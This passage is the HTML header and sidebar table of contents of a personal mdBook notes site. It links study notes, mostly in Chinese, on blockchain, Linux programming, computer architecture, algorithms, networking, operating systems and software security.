<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Reticence&#x27;s Notes</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->

        <!-- MathJax -->
        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="index.html">Index</a></li><li class="chapter-item "><a href="Advanced/index.html">Advanced</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/index.html">Block Chain</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/Basic/index.html">区块链技术</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/Basic/Consensus.html">共识机制</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Basic/Crypto.html">加密</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Basic/Distribute.html">分布式存储</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Basic/P2P.html">P2P</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Basic/SmartContract.html">如何执行智能合约</a></li></ol></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/index.html">DeFi</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/Defi/DAO.html">Decentralized Autonomous Organization</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/Derivative.html">Decentralized Derivative</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/Exchange.html">Decentralized Exchange</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/FundManagement.html">Decentralized Fund Management</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/Insurance.html">Decentralized Insurance</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/LendBorrow.html">Decentralized Lending & Borrowing</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/Lottery.html">Decentralized Lottery</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/Payments.html">Decentralized Payments</a></li><li class="chapter-item "><a href="Advanced/Blockchain/Defi/StableCoin.html">Stable Coins</a></li></ol></li><li class="chapter-item "><a href="Advanced/Blockchain/Ethernet/index.html">Ethernet</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/Ethernet/Solidity.html">Solidity简介</a></li></ol></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/index.html">Hello NEAR</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/PoS.html">Proof-of-Stake</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/Promise.html">异步模型</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/Secure.html">Secure</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/Snippets.html">Snippets</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/Standards.html">标准实现代码分析</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/dao.html">dao</a></li><li class="chapter-item "><a href="Advanced/Blockchain/NEAR/wasm.html">wasm</a></li></ol></li></ol></li><li class="chapter-item "><a href="Advanced/Linux/index.html">Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/index.html">Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/Credential.html">Credential</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/Debug笔记.html">Debug笔记</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/File_System.html">File System</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/Linux内核设计与实现笔记.html">《Linux内核设计与实现》笔记</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/Linux设备驱动笔记.html">《Linux设备驱动》笔记</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/RCU.html">RCU</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/Rust_for_linux.html">Rust for linux</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/System_Call.html">System Call</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/context_switch.html">进程调度时的context_switch</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/内核编程笔记.html">Linux内核编程笔记</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/数据结构.html">数据结构</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/调试Linux内核环境搭建.html">调试Linux内核环境搭建</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxKernel/调试时如何获取current.html">调试Linux内核，寻找current</a></li></ol></li><li class="chapter-item "><a href="Advanced/Linux/LinuxPlay/index.html">LinuxPlay</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Linux/LinuxPlay/Linux使用笔记.html">Linux使用笔记</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxPlay/使用SSH远程登录.html">Linux使用SSH远程登录</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxPlay/在Linux中找到可用的网络接口.html">在Linux中找到可用的网络接口</a></li></ol></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/index.html">Linux Program</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/Deamon.html">Daemon</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/Fanotify.html">Fanotify</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/File.html">File Program</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/IObound.html">I/O bound 程序优化</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/Linux目录结构.html">Linux目录结构</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/NetLink.html">Netlink</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/Socket.html">Socket</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/eBPF.html">eBPF</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/prctl.html">进程</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/信号.html">信号</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/共享库.html">共享库</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/凭证.html">Credential 凭证</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/反向Shell和伪终端.html">反向Shell和伪终端</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/性能监控.html">性能监控</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/桌面应用开发.html">桌面应用开发</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/管道和重定向.html">管道和重定向</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/系统限制和选项.html">系统限制和选项</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/终端.html">终端</a></li><li class="chapter-item "><a href="Advanced/Linux/LinuxProgram/进程间通信.html">进程间通信</a></li></ol></li></ol></li><li class="chapter-item "><a href="Advanced/Windows/index.html">Windows Programming</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Advanced/Windows/Unicode.html">Unicode</a></li><li class="chapter-item "><a href="Advanced/Windows/hungarian.html">匈牙利命名法</a></li><li class="chapter-item "><a href="Advanced/Windows/文件.html">文件</a></li></ol></li></ol></li><li class="chapter-item "><a href="Basic/index.html">Basic</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/8086汇编笔记.html">8086汇编笔记</a></li><li class="chapter-item "><a href="Basic/Architecture/index.html">Architecture</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Architecture/ARM内存管理.html">AArch64 memory management</a></li><li class="chapter-item "><a href="Basic/Architecture/ARM寄存器.html">ARM中的寄存器</a></li><li class="chapter-item "><a href="Basic/Architecture/ARM异常.html">AArch64 Exception Model</a></li><li class="chapter-item "><a href="Basic/Architecture/ARM虚拟化.html">Armv8-A virtualization</a></li><li class="chapter-item "><a href="Basic/Architecture/ARM调试.html">ARM self-hosted debug</a></li><li class="chapter-item "><a href="Basic/Architecture/CPU设计.html">CPU设计</a></li><li class="chapter-item "><a href="Basic/Architecture/Cache.html">Cache</a></li><li class="chapter-item "><a href="Basic/Architecture/ILP.html">ILP</a></li><li class="chapter-item "><a href="Basic/Architecture/SIMD和MIMD.html">SIMD和MIMD</a></li><li class="chapter-item "><a href="Basic/Architecture/TLP.html">TLP</a></li><li class="chapter-item "><a href="Basic/Architecture/存储器设计.html">存储器设计</a></li><li class="chapter-item "><a href="Basic/Architecture/数字逻辑.html">Notes-数字逻辑</a></li><li class="chapter-item "><a href="Basic/Architecture/计算机体系结构.html">计算机组成&计算机体系结构</a></li></ol></li><li class="chapter-item "><a href="Basic/C/index.html">C/C++</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/C/Cpp标准库.html">C++_标准库</a></li><li class="chapter-item "><a href="Basic/C/Cpp课程笔记.html">C++ 基础知识</a></li><li class="chapter-item "><a href="Basic/C/GCC内嵌汇编.html">C-内嵌汇编</a></li><li class="chapter-item "><a href="Basic/C/变量在ELF段中的位置.html">变量在ELF段中的位置</a></li><li class="chapter-item "><a href="Basic/C/可变参数的使用和原理.html">可变参数的使用和原理</a></li><li class="chapter-item "><a href="Basic/C/在C程序中调用汇编程序.html">在C程序中调用汇编程序</a></li><li class="chapter-item "><a href="Basic/C/链接器.html">链接器</a></li></ol></li><li class="chapter-item "><a href="Basic/Client/index.html">Client Development</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Client/Chromium.html">Chromium</a></li><li class="chapter-item "><a href="Basic/Client/CodeReview.html">CodeReview</a></li><li class="chapter-item "><a href="Basic/Client/Config.html">Config</a></li><li class="chapter-item "><a href="Basic/Client/CrossLanguage.html">跨语言</a></li><li class="chapter-item "><a href="Basic/Client/DataStore.html">本地存储</a></li><li class="chapter-item "><a href="Basic/Client/Database.html">Database</a></li><li class="chapter-item "><a href="Basic/Client/Flutter.html">Flutter</a></li><li class="chapter-item "><a href="Basic/Client/Log.html">日志</a></li><li class="chapter-item "><a href="Basic/Client/Multimedia/index.html">Multimedia</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Client/Multimedia/Graph.html">图形学</a></li><li class="chapter-item "><a href="Basic/Client/Multimedia/Image.html">图像处理技术</a></li><li class="chapter-item "><a href="Basic/Client/Multimedia/Video.html">视频</a></li><li class="chapter-item "><a href="Basic/Client/Multimedia/Voice.html">Voice</a></li></ol></li><li class="chapter-item "><a href="Basic/Client/Network.html">网络能力</a></li><li class="chapter-item "><a href="Basic/Client/Performance.html">性能监控</a></li><li class="chapter-item "><a href="Basic/Client/Platform/index.html">Platform</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Client/Platform/Android.html">Android</a></li><li class="chapter-item "><a href="Basic/Client/Platform/iOS.html">iOS</a></li></ol></li><li class="chapter-item "><a href="Basic/Client/SQLite.html">SQLite</a></li></ol></li><li class="chapter-item "><a href="Basic/Compiler/index.html">Compiler</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Compiler/Codegen.html">代码生成</a></li><li class="chapter-item "><a href="Basic/Compiler/Lex.html">Lex</a></li><li class="chapter-item "><a href="Basic/Compiler/Lexical.html">Lexical Analyze</a></li><li class="chapter-item "><a href="Basic/Compiler/Runtime.html">Runtime</a></li><li class="chapter-item "><a href="Basic/Compiler/Sematic.html">Sematic Analyzing</a></li><li class="chapter-item "><a href="Basic/Compiler/Syntax.html">Syntax Analyzer</a></li><li class="chapter-item "><a href="Basic/Compiler/llvm-ir.html">LLVM-IR</a></li><li class="chapter-item "><a href="Basic/Compiler/llvm.html">LLVM</a></li><li class="chapter-item "><a href="Basic/Compiler/pest.html">PEST</a></li><li class="chapter-item "><a href="Basic/Compiler/yacc.html">Yacc</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/index.html">Data Structure And Algorithm</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/index.html">Algorithm</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Approximation.html">近似算法</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Backtracking.html">递归回溯</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/DivideAndConquer.html">分治算法</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/DynamicProgramming.html">动态规划</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Greedy.html">贪心算法</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/LocalSearch.html">本地搜索</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Parallel.html">并行算法</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Randomized.html">随机化算法</a></li><li class="chapter-item "><a href="Basic/DataStructure/Algorithm/Sort.html">排序算法</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/index.html">Graph</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Graph/Bipartite.html">Bipartite</a></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/NetworkFlow.html">NetworkFlow</a></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/ShortPath.html">最短路</a></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/SpanningTree.html">最小生成树</a></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/关键路径.html">关键路径</a></li><li class="chapter-item "><a href="Basic/DataStructure/Graph/拓扑排序.html">拓扑排序</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/Hash/index.html">Hash</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Hash/HashTree.html">HashTree</a></li><li class="chapter-item "><a href="Basic/DataStructure/Hash/Hashing.html">Hashing</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/Heap/index.html">Heap</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Heap/BinomialHeap.html">Binomial Heap</a></li><li class="chapter-item "><a href="Basic/DataStructure/Heap/FibonacciHeap.html">FibonacciHeap</a></li><li class="chapter-item "><a href="Basic/DataStructure/Heap/Heap.html">DS-Heap</a></li><li class="chapter-item "><a href="Basic/DataStructure/Heap/斜堆.html">Leftist_Heap_and_Skew_Heap</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/Inverted_File_Index.html">Inverted_File_Index</a></li><li class="chapter-item "><a href="Basic/DataStructure/Linear/index.html">Linear</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Linear/Bitmap.html">DS-Bitmap</a></li><li class="chapter-item "><a href="Basic/DataStructure/Linear/List.html">DS-Linear_List</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/NPProblem.html">DS-NP_problem</a></li><li class="chapter-item "><a href="Basic/DataStructure/String/index.html">字符串匹配相关算法</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/String/match.html">字符串匹配算法</a></li></ol></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/index.html">Tree and BST</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/DataStructure/Tree/BTree.html">B Tree and B+ Tree</a></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/BalancedTree.html">AVL Tree and Splay Tree</a></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/DisjointSet.html">Disjoint Set</a></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/HuffmanTree.html">Huffman Tree</a></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/RBTree.html">红黑树 B树 B+树</a></li><li class="chapter-item "><a href="Basic/DataStructure/Tree/ThreadedTree.html">Threaded Binary Tree</a></li></ol></li></ol></li><li class="chapter-item "><a href="Basic/Database/index.html">Database</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Database/Object.html">Database-Object-Based_Databases</a></li><li class="chapter-item "><a href="Basic/Database/PostgreSQL-Conflict-reticenceji_Win10.html">Database-PostgreSQL</a></li><li class="chapter-item "><a href="Basic/Database/PostgreSQL.html">Database-PostgreSQL</a></li><li class="chapter-item "><a href="Basic/Database/SQL-Conflict-reticenceji_Win10.html">基础SQL</a></li><li class="chapter-item "><a href="Basic/Database/SQL.html">基础SQL</a></li><li class="chapter-item "><a href="Basic/Database/XML-Conflict-reticenceji_Win10.html">Database,Web-XML</a></li><li class="chapter-item "><a href="Basic/Database/XML.html">Database,Web-XML</a></li><li class="chapter-item "><a href="Basic/Database/事务.html">Database-事务</a></li><li class="chapter-item "><a href="Basic/Database/关系代数.html">Database-关系代数</a></li><li class="chapter-item "><a href="Basic/Database/存储和查询.html">Database-存储和查询</a></li><li class="chapter-item "><a href="Basic/Database/导论.html">Database-导论</a></li><li class="chapter-item "><a href="Basic/Database/数据库设计.html">Database-数据库设计</a></li></ol></li><li class="chapter-item "><a href="Basic/Maths/index.html">Maths</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Maths/大数定理和中心极限定理.html">大数定理和中心极限定理</a></li><li class="chapter-item "><a href="Basic/Maths/微积分下.html">微积分下</a></li><li class="chapter-item "><a href="Basic/Maths/数值计算方法.html">数值计算方法</a></li><li class="chapter-item "><a href="Basic/Maths/最小二乘法.html">最小二乘法</a></li><li class="chapter-item "><a href="Basic/Maths/有限自动机介绍.html">有限自动机介绍</a></li><li class="chapter-item "><a href="Basic/Maths/概统复习.html">概统复习</a></li><li class="chapter-item "><a href="Basic/Maths/群论简介.html">群论简介</a></li></ol></li><li class="chapter-item "><a href="Basic/Networking/index.html">Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Networking/ARP.html">Networking-ARP</a></li><li class="chapter-item "><a href="Basic/Networking/CDN.html">CDN</a></li><li class="chapter-item "><a href="Basic/Networking/DNS.html">DNS</a></li><li class="chapter-item "><a href="Basic/Networking/FTP.html">FTP</a></li><li class="chapter-item "><a href="Basic/Networking/HTTP.html">HTTP</a></li><li class="chapter-item "><a href="Basic/Networking/ICMP.html">Internet Control Message Protocol</a></li><li class="chapter-item "><a href="Basic/Networking/Mail.html">邮件协议</a></li><li class="chapter-item "><a href="Basic/Networking/NAT.html">Network Address Translation</a></li><li class="chapter-item "><a href="Basic/Networking/P2P.html">P2P</a></li><li class="chapter-item "><a href="Basic/Networking/QUIC.html">QUIC</a></li><li class="chapter-item "><a href="Basic/Networking/RTC.html">RTC</a></li><li class="chapter-item "><a href="Basic/Networking/Socket.html">Socket</a></li><li class="chapter-item "><a href="Basic/Networking/TCP.html">TCP</a></li><li class="chapter-item "><a href="Basic/Networking/UDP.html">UDP</a></li><li class="chapter-item "><a href="Basic/Networking/VMWare虚拟机网络配置.html">VMWare虚拟机网络配置</a></li><li class="chapter-item "><a href="Basic/Networking/VPN.html">VPN</a></li><li class="chapter-item "><a href="Basic/Networking/WebSocket.html">WebSocket</a></li><li class="chapter-item "><a href="Basic/Networking/介质访问子层.html">Medium Access Sublayer</a></li><li class="chapter-item "><a href="Basic/Networking/可靠传输.html">可靠传输</a></li><li class="chapter-item "><a href="Basic/Networking/差错控制.html">差错控制</a></li><li class="chapter-item "><a href="Basic/Networking/拥塞控制和流量控制.html">拥塞控制和流量控制</a></li><li class="chapter-item "><a href="Basic/Networking/物理层.html">物理层</a></li><li class="chapter-item "><a href="Basic/Networking/网络层.html">网络层 IP</a></li><li class="chapter-item "><a href="Basic/Networking/网络设备.html">Networking-网络设备</a></li><li class="chapter-item "><a href="Basic/Networking/路由协议.html">路由协议</a></li><li class="chapter-item "><a href="Basic/Networking/链路层.html">链路层</a></li></ol></li><li class="chapter-item "><a href="Basic/OS/index.html">OS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/OS/Bootloader.html">OS-Bootloader</a></li><li class="chapter-item "><a href="Basic/OS/Buddy_System&Slub.html">OS-Buddy_System&Slub</a></li><li class="chapter-item "><a href="Basic/OS/Deadlock.html">OS-Deadlock</a></li><li class="chapter-item "><a href="Basic/OS/IO.html">OS-IO</a></li><li class="chapter-item "><a href="Basic/OS/Introduction.html">OS-Introduction</a></li><li class="chapter-item "><a href="Basic/OS/Memory_Management.html">OS-Memory_Management</a></li><li class="chapter-item "><a href="Basic/OS/Process.html">OS-Process</a></li><li class="chapter-item "><a href="Basic/OS/Q&A.html">OS-Q&A</a></li><li class="chapter-item "><a href="Basic/OS/RISCV学习笔记.html">OS-RISCV学习笔记</a></li><li class="chapter-item "><a href="Basic/OS/SBI.html">OS-SBI</a></li><li class="chapter-item "><a href="Basic/OS/Synchronization.html">OS-Synchronization</a></li><li class="chapter-item "><a href="Basic/OS/Thread.html">OS-Thread</a></li><li class="chapter-item "><a href="Basic/OS/UnixLinux中的IO模型.html">Linux中的I/O模型</a></li><li class="chapter-item "><a href="Basic/OS/在K210运行裸机程序.html">OS-在K210运行裸机程序</a></li><li class="chapter-item "><a href="Basic/OS/地址空间(一).html">OS-地址空间(一)</a></li><li class="chapter-item "><a href="Basic/OS/操作系统.html">OS-操作系统</a></li></ol></li><li class="chapter-item "><a href="Basic/Secure/index.html">Secure</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Secure/Crypto/index.html">Crypto</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Secure/Crypto/Federated_Learning.html">Federated Learning</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/Oblivious_RAM.html">Oblivious RAM</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/PIR.html">PIR</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/PSI.html">Private set intersection</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/加密和哈希.html">Crypto-加密和哈希</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/加密数据库.html">Encrypted Database</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/区块链技术.html">Bitcoin-区块链技术</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/可证明安全.html">可证明安全</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/安全多方计算.html">安全多方计算</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/密码学基础.html">密码学算法介绍</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/密码学进阶.html">密码学进阶</a></li><li class="chapter-item "><a href="Basic/Secure/Crypto/差分隐私.html">差分隐私</a></li></ol></li><li class="chapter-item "><a href="Basic/Secure/CryptoBasic.html">密码学基础</a></li><li class="chapter-item "><a href="Basic/Secure/CtyptoProtocol.html">密码学协议</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/index.html">电子取证</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Secure/Forensics/FAT.html">FAT文件系统</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/FileCarving.html">文件雕复</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/Linux取证.html">Linux取证</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/Memory.html">内存取证</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/NTFS.html">NTFS文件系统</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/Windows取证.html">Windows取证</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/数据隐藏.html">数据隐藏</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/文件系统取证.html">文件系统取证</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/硬盘分析.html">硬盘分析</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/移动设备取证.html">移动设备取证</a></li><li class="chapter-item "><a href="Basic/Secure/Forensics/网络取证.html">网络取证</a></li></ol></li><li class="chapter-item "><a href="Basic/Secure/IoT.html">无线与物联网安全</a></li><li class="chapter-item "><a href="Basic/Secure/Network.html">网络安全</a></li><li class="chapter-item "><a href="Basic/Secure/OperatingSystem.html">操作系统安全</a></li><li class="chapter-item "><a href="Basic/Secure/Software/index.html">软件安全</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Basic/Secure/Software/ASLR.html">ASLR</a></li><li class="chapter-item "><a href="Basic/Secure/Software/CodeQL.html">CodeQL</a></li><li class="chapter-item "><a href="Basic/Secure/Software/GlibcHeap.html">glibc heap allocator</a></li><li class="chapter-item "><a href="Basic/Secure/Software/PIC.html">位置无关代码和共享库</a></li><li class="chapter-item "><a href="Basic/Secure/Software/RELRO.html">RELRO</a></li><li class="chapter-item "><a href="Basic/Secure/Software/pwntools.html">pwntools</a></li><li class="chapter-item "><a href="Basic/Secure/Software/攻击视角.html">攻击软件安全</a></li><li class="chapter-item "><a href="Basic/Secure/Software/程序分析.html">程序分析</a></li><li class="chapter-item "><a href="Basic/Secure/Software/防御视角.html">软件安全防护</a></li></ol></li><li class="chapter-item "><a href="Basic/Secure/SupplyChain.html">供应链安全</a></li></ol></li><li class="chapter-item "><a href="Basic/软件保护技术.html">Reverse</a></li></ol></li><li class="chapter-item "><a href="Language/index.html">Language</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Java/index.html">Java</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Java/基础.html">Java</a></li><li class="chapter-item "><a href="Language/Java/鸿蒙应用开发.html">Java-鸿蒙应用开发</a></li></ol></li><li class="chapter-item "><a href="Language/JavaScript/index.html">JavaScript</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/JavaScript/Electron.html">Electron</a></li><li class="chapter-item "><a href="Language/JavaScript/JavaScript简介.html">JavaScript简介</a></li><li class="chapter-item "><a href="Language/JavaScript/Runtime.html">Runtime</a></li></ol></li><li class="chapter-item "><a href="Language/Python/index.html">Python</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Python/0内置类型/index.html">内置对象</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="Language/Python/0内置类型/1字符串.html">字符串和字节串</a></li><li class="chapter-item "><a href="Language/Python/0内置类型/2数值.html">数值</a></li><li class="chapter-item "><a href="Language/Python/0内置类型/3列表和元组.html">序列</a></li><li class="chapter-item "><a href="Language/Python/0内置类型/4字典和集合.html">映射</a></li><li class="chapter-item "><a href="Language/Python/0内置类型/5迭代器和生成器.html">迭代器和生成器</a></li><li class="chapter-item "><a 